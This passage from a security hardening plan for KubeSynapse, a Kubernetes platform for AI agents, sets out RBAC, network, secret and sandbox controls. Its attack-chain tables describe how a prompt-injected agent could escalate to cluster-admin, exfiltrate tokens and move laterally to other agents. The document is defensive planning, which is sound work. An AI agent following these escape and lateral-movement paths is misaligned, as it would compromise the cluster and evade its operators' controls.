      add_header X-Frame-Options "DENY" always;
      add_header X-Content-Type-Options "nosniff" always;
      add_header Referrer-Policy "strict-origin-when-cross-origin" always;
      add_header Permissions-Policy "accelerometer=(), camera=(), geolocation=(), microphone=()" always;
  ```
- [ ] Make configurable: `apiGateway.ingress.securityHeaders: true`

#### 4B.3 PostgreSQL SSL

**Finding:** Default `sslMode: prefer` falls back to cleartext.

**Implementation:**

- [ ] Change default `sslMode` to `require` in `values.schema.json`
- [ ] Document that `verify-full` requires CA cert configuration
- [ ] Add `DATABASE_SSLMODE` env var to api-gateway and operator deployments

---

## Workstream 5: Admission Webhooks & CRD Validation

> **DEFERRED** to a separate PR. Documented here for completeness.

### Phase 5A — Validating Webhook

**Priority:** HIGH (deferred)  
**Timeline:** Separate PR after core hardening  

#### 5A.1 ValidatingWebhookConfiguration

**Finding:** No admission webhooks for AIAgent CRDs.

**Implementation (future):**

- [ ] Create `operator/webhooks/validate_aiagent.py` module
- [ ] Validate at admission time:
  - No `env` values starting with `!` (Pi config RCE)
  - No `configFiles` entries containing `"plugin"` with non-empty array
  - No `mcpConnections[].command` not in allowlist
  - All egress CIDRs are valid CIDR notation
  - No `spec.provider.options.baseURL` pointing to non-allowlisted domains
- [ ] Create `charts/kubesynapse/templates/webhook.yaml`:
  - `ValidatingWebhookConfiguration` resource
  - TLS cert-manager Certificate for webhook HTTPS
  - Service targeting the webhook pods
- [ ] Add `webhook.enabled: false` to `values.yaml` (opt-in initially)

#### 5A.2 CRD Schema Tightening

**Finding:** `x-kubernetes-preserve-unknown-fields: true` bypasses schema validation.

**Implementation (future):**

- [ ] Remove `x-kubernetes-preserve-unknown-fields: true` from:
  - `mcpConnections` field — enumerate all valid sub-fields
  - `selector` field — define as standard label selector schema
- [ ] Requires CRD version bump (backward-incompatible schema change)
- [ ] Add migration guide for existing CRDs

---

## Cross-Cutting Concerns

### Secret Management Strategy

| Environment | Approach | Secret Store |
|-------------|----------|--------------|
| Local dev (`kind`) | `platformSecrets.mode: native` with auto-generated values | Kubernetes Secret |
| Staging | `platformSecrets.mode: external-secrets` with Vault dev server | HashiCorp Vault |
| Production | `platformSecrets.mode: external-secrets` with production Vault | HashiCorp Vault / AWS SM / Azure KV |

**Rules:**
1. Never store secrets in `values.yaml` files committed to git
2. Use `--set` or `--set-file` for sensitive values during install
3. Enable encryption at rest on the Kubernetes cluster (`EncryptionConfiguration`)
4. Rotate all secrets on a schedule (JWT: 30 days, API keys: 90 days, Redis/NATS: 180 days)

### Monitoring & Alerting

| Signal | Alert Condition | Severity |
|--------|----------------|----------|
| Operator RBAC audit log | Any `create` on `clusterrolebindings` | CRITICAL |
| Runtime pod egress | Connection to IP not in allowlist | HIGH |
| MCP sidecar 401 | >5 unauthorized requests in 1 minute | HIGH |
| Redis AUTH failure | Any `AUTH` command failure | MEDIUM |
| JWT token forgery | Token with unknown `kid` header | CRITICAL |
| Agent pod escape attempt | Blocked syscall in seccomp log | HIGH |

### Image Signing & Verification (Tier 3)

- [ ] Sign all KubeSynapse container images with `cosign`
- [ ] Deploy Sigstore policy controller or Kyverno with image verification policy
- [ ] Reject unsigned images at admission time
- [ ] Publish public key in the chart documentation

---

## Implementation Schedule

```
┌─────────────────────────────────────────────────────────────────────┐
│ WEEK 1: Critical — Stop Known Escalation Paths                      │
├─────────────────────────────────────────────────────────────────────┤
│ Day 1-2:                                                             │
│   ├── Phase 1A.1: Redis authentication                              │
│   ├── Phase 1A.2: NATS authentication                               │
│   ├── Phase 1A.3: JWT_SECRET fail-secure                            │
│   └── Phase 1A.4: cookieSecure: true                                │
│ Day 3-4:                                                             │
│   ├── Phase 2A.1: Wire verify_bearer_token() in MCP base            │
│   ├── Phase 2B.1: code-exec egress deny-all (application)           │
│   └── Phase 2B.2: code-exec egress deny-all (iptables)              │
│ Day 5:                                                               │
│   ├── Phase 3A.1: Runtime env var allowlist in operator              │
│   └── Helm template validation + local kind deploy test              │
├─────────────────────────────────────────────────────────────────────┤
│ WEEK 2: High — Reduce Blast Radius                                   │
├─────────────────────────────────────────────────────────────────────┤
│ Day 6-7:                                                             │
│   ├── Phase 1B.2: Scope operator secret access                      │
│   ├── Phase 1B.3: Dedicated worker ServiceAccount                   │
│   └── Phase 1B.4: Remove tenant pods/exec                           │
│ Day 8-9:                                                             │
│   ├── Phase 1C.1: Narrow K8s API egress CIDR                        │
│   ├── Phase 1C.2: Egress deny-all for data stores                   │
│   └── Phase 1C.3: NATS monitoring port hardening                    │
│ Day 10:                                                              │
│   ├── Phase 3B.1: OpenCode hardened config ConfigMap                 │
│   ├── Phase 3B.2: Pi hardened config ConfigMap                       │
│   └── Phase 3B.3: Operator CRD validation (pre-webhook)             │
├─────────────────────────────────────────────────────────────────────┤
│ WEEK 3: Medium — Defense in Depth                                    │
├─────────────────────────────────────────────────────────────────────┤
│ Day 11-12:                                                           │
│   ├── Phase 4A.1: Redis-backed rate limiting                        │
│   ├── Phase 4A.2: Global API rate limiting                          │
│   └── Phase 4A.3: A2A error sanitization                            │
│ Day 13:                                                              │
│   ├── Phase 2C.1: Pin base images to digests                        │
│   ├── Phase 2C.2: kubectl checksum verification                     │
│   └── Phase 2C.3: Migration job image pinning                       │
│ Day 14-15:                                                           │
│   ├── Phase 4B.1: Dependency upgrades                               │
│   ├── Phase 4B.2: Ingress security headers                          │
│   └── Phase 4B.3: PostgreSQL SSL                                    │
├─────────────────────────────────────────────────────────────────────┤
│ WEEK 4: Ongoing — Continuous Hardening                               │
├─────────────────────────────────────────────────────────────────────┤
│   ├── Phase 3C.2: Seccomp profile                                   │
│   ├── Phase 3C.3: AppArmor profile (if cluster supports)            │
│   ├── Phase 3D: gVisor support (optional)                           │
│   ├── Phase 2A (follow-up): Per-agent MCP tokens                    │
│   └── Phase 1A.5: TLS enforcement with cert-manager                 │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Decision Log

| # | Date | Decision | Rationale |
|---|------|----------|-----------|
| D1 | 2026-05-19 | Redis/NATS auth: auto-generate with persistence | Simpler for users; works out-of-box. Production should use ExternalSecrets. |
| D2 | 2026-05-19 | MCP tokens: fix shared token first | Quick win blocks the most common lateral movement path. Per-agent follows. |
| D3 | 2026-05-19 | Env stripping: pod spec only (no wrapper scripts) | Fewer moving parts; operator controls the pod spec authoritatively. |
| D4 | 2026-05-19 | Admission webhooks: separate PR | Requires TLS cert management and dedicated deployment; better as its own feature. |
| D5 | 2026-05-19 | Pi default permissionLevel: change to "strict" | The runtime has zero built-in safety; platform must enforce. |
| D6 | 2026-05-19 | Code-exec egress: deny-all at both app and network layers | Defense in depth; network-layer prevents bypass of application checks. |

---

## Verification Checklist

After full implementation, verify each control:

### Infrastructure Auth
- [ ] `redis-cli ping` without password returns `NOAUTH`
- [ ] `nats-sub` without token returns `Authorization Violation`
- [ ] Gateway pod with empty `JWT_SECRET` fails to start (CrashLoopBackOff)
- [ ] Browser cannot access platform over HTTP when TLS is enforced

### RBAC
- [ ] Operator SA cannot create ClusterRoleBindings: `kubectl auth can-i create clusterrolebindings --as=system:serviceaccount:<ns>:<operator-sa>` returns `no`
- [ ] Worker SA cannot read secrets from other namespaces
- [ ] Tenant admin cannot exec into pods (when `tenantExecAccess: false`)

### MCP Sidecars
- [ ] Calling MCP tool without `Authorization` header returns 401
- [ ] `code-exec` sidecar cannot make outbound HTTP requests (curl times out)
- [ ] MCP bearer token is different from `REPLACE-WITH-STRONG-SECRET`

### Runtime Isolation
- [ ] `kubectl exec <agent-pod> -c runtime -- env` shows only ~10 vars
- [ ] Agent cannot write to `/etc/`, `/root/`, or any path outside `/workspace` and `/tmp`
- [ ] OpenCode runtime does not load any plugins (verify in logs)
- [ ] Pi runtime does not load any extensions (verify in logs)
- [ ] Pi runtime `SYSTEM.md` is not present (default system prompt used)

### Network
- [ ] Agent pod cannot curl arbitrary internet hosts (only LiteLLM + DNS)
- [ ] Redis pod cannot initiate outbound connections
- [ ] NATS monitoring port is not reachable from arbitrary pods

### API Gateway
- [ ] Rate limiting works across multiple gateway pods (shared state)
- [ ] A2A errors return generic message (no stack traces)
- [ ] CORS with `*` origin is rejected at startup

---

## Attack Chain Mitigations

### Chain 1: Agent -> Operator SA -> cluster-admin

| Step | Before | After |
|------|--------|-------|
| Agent gets code exec | Possible via prompt injection | Still possible (runtime vulnerability) |
| Agent accesses operator SA token | Worker shares operator SA | Worker has dedicated minimal SA |
| Attacker creates ClusterRoleBinding | Operator can create CRBs | Permission removed from operator |
| **Outcome** | Full cluster compromise | Blocked at step 2-3 |

### Chain 2: Agent -> MCP Sidecar -> All Agents

| Step | Before | After |
|------|--------|-------|
| Agent calls sidecar directly | No authentication | Bearer token required (401) |
| Code-exec exfiltrates shared token | No egress restriction | Egress deny-all (iptables + app) |
| Token used to reach other agents' sidecars | Shared token works everywhere | Token enforcement + future per-agent tokens |
| **Outcome** | Lateral movement to all agents | Blocked at step 1-2 |

### Chain 3: Helm Values Leak -> Platform Compromise

| Step | Before | After |
|------|--------|-------|
| Attacker reads values.yaml | Secrets in plaintext | ExternalSecrets with Vault (no secrets in values) |
| Attacker forges JWT | JWT_SECRET known | Key in Vault, rotated every 30 days |
| **Outcome** | Full admin access | Blocked at step 1 (secrets not in values) |

### Chain 4: Redis/NATS Compromise -> Session Hijacking

| Step | Before | After |
|------|--------|-------|
| Pod reaches Redis/NATS | No auth required | Password/token required |
| Attacker reads session data | Full read/write access | Denied without credentials |
| **Outcome** | Session hijacking | Blocked at step 1 (auth required) |

### Chain 5: No TLS -> Credential Theft

| Step | Before | After |
|------|--------|-------|
| Attacker sniffs traffic | HTTP cleartext | TLS enforced (HTTPS only) |
| Cookies captured | `cookieSecure: false` | `cookieSecure: true` (only sent over HTTPS) |
| **Outcome** | Session hijacking | Blocked at step 1 (TLS encrypted) |

---

## Appendix A: Environment Variable Allowlist by Runtime

### OpenCode Runtime Container

```yaml
env:
  - name: HOME
    value: /workspace/.home
  - name: PATH
    value: /usr/local/bin:/usr/bin:/bin
  - name: USER
    value: agent
  - name: LANG
    value: en_US.UTF-8
  - name: TERM
    value: xterm-256color
  - name: TMPDIR
    value: /tmp
  - name: HOSTNAME
    valueFrom:
      fieldRef:
        fieldPath: metadata.name
  - name: POD_NAMESPACE
    valueFrom:
      fieldRef:
        fieldPath: metadata.namespace
  # Runtime config (read-only mount)
  - name: OPENCODE_CONFIG
    value: /etc/kubesynapse/opencode.json
  # Single LLM API key (via secretKeyRef)
  - name: ANTHROPIC_API_KEY  # or OPENAI_API_KEY based on provider
    valueFrom:
      secretKeyRef:
        name: <agent-secret>
        key: LLM_API_KEY
  # Internal platform URLs
  - name: LITELLM_INTERNAL_URL
    value: http://<release>-litellm:4000
  - name: MCP_BEARER_TOKEN
    valueFrom:
      secretKeyRef:
        name: <agent-mcp-secret>
        key: bearer-token
```

### Pi Runtime Container

```yaml
env:
  - name: HOME
    value: /workspace/.home
  - name: PATH
    value: /usr/local/bin:/usr/bin:/bin
  - name: USER
    value: agent
  - name: LANG
    value: en_US.UTF-8
  - name: TERM
    value: xterm-256color
  - name: TMPDIR
    value: /tmp
  - name: PI_CONFIG_DIR
    value: /etc/kubesynapse/pi-config
  - name: PI_PERMISSION_LEVEL
    value: strict
  - name: HOSTNAME
    valueFrom:
      fieldRef:
        fieldPath: metadata.name
  - name: POD_NAMESPACE
    valueFrom:
      fieldRef:
        fieldPath: metadata.namespace
  # Single LLM API key
  - name: ANTHROPIC_API_KEY
    valueFrom:
      secretKeyRef:
        name: <agent-secret>
        key: LLM_API_KEY
  # Internal platform URLs
  - name: LITELLM_INTERNAL_URL
    value: http://<release>-litellm:4000
  - name: MCP_BEARER_TOKEN
    valueFrom:
      secretKeyRef:
        name: <agent-mcp-secret>
        key: bearer-token
```

---

## Appendix B: Files Changed Per Workstream

| Workstream | Files Modified | Files Created |
|------------|---------------|---------------|
| 1A (Auth) | `values.yaml`, `redis.yaml`, `nats.yaml`, `litellm-configmap.yaml`, `api-gateway.yaml`, `external-secrets.yaml`, `operator-deployment.yaml` | — |
| 1B (RBAC) | `operator-rbac.yaml`, `operator-deployment.yaml`, `operator/controllers/tenant_controller.py`, `operator/builders/manifests.py` | — |
| 1C (Network) | `agent-network-policy.yaml`, `redis.yaml`, `nats.yaml`, `qdrant.yaml`, `values.yaml` | — |
| 2A (MCP Auth) | `mcp-sidecars/base/mcp_base.py`, `mcp-server-deployment.yaml`, `_helpers.tpl` | — |
| 2B (Code-Exec) | `mcp-sidecars/code-exec/capabilities.json`, `mcp_base.py`, `operator/builders/manifests.py` | — |
| 2C (Supply Chain) | All `mcp-sidecars/*/Dockerfile`, `pvc-retention-migration-job.yaml` | `mcp-sidecars/*/requirements.lock` |
| 3A (Env) | `operator/builders/manifests.py` | — |
| 3B (Config) | `operator/builders/manifests.py`, `operator/controllers/agent_controller.py` | `templates/opencode-safe-config.yaml`, `templates/pi-safe-config.yaml` |
| 3C (Kernel) | `operator/builders/manifests.py`, `values.yaml` | `files/agent-seccomp.json` |
| 4A (Rate Limit) | `api-gateway/auth_store.py`, `api-gateway/webhook_security.py`, `api-gateway/main.py`, `api-gateway/routers/a2a.py` | `api-gateway/rate_limiter.py` |
| 4B (Deps) | `api-gateway/requirements.txt`, `api-gateway.yaml`, `values.yaml` | `api-gateway/requirements.lock` |
| 5A (Webhooks) | `values.yaml` | `operator/webhooks/`, `templates/webhook.yaml` |

---

## Appendix C: Secure Defaults Summary

After full implementation, the default `values.yaml` should enforce:

```yaml
# Security-critical defaults
apiGateway:
  auth:
    cookieSecure: true           # was: false
    registrationEnabled: false   # was: true (open registration)
  tls:
    enabled: true                # was: false
    allowInsecure: false         # new: must explicitly opt-in to HTTP

redis:
  auth:
    password: ""                 # auto-generated if empty

nats:
  auth:
    token: ""                    # auto-generated if empty

piRuntime:
  permissionLevel: "strict"      # was: "permissive"

agentRuntime:
  clusterReadAccess: false       # already correct
  tenantExecAccess: false        # new: no pods/exec by default
  runtimeClassName: ""           # new: set to "gvisor" for max isolation
  seccompProfile: "RuntimeDefault"  # new: custom profile available

networkPolicy:
  enabled: true                  # already correct
  clusterApiCidr: ""             # was: "0.0.0.0/0" — now required

mcpHub:
  auth:
    bearerToken: ""              # required or auto-generated
```

---

## References

- [OpenCode Runtime Security Audit](opencode-security-audit.md)
- [Pi Runtime Security Audit](pi-security-audit.md)
- [KubeSynapse Platform Security Audit](kubesynapse-platform-security-audit.md)
- [CIS Kubernetes Benchmark v1.8](https://www.cisecurity.org/benchmark/kubernetes)
- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [NIST AI RMF](https://www.nist.gov/artificial-intelligence/risk-management-framework)
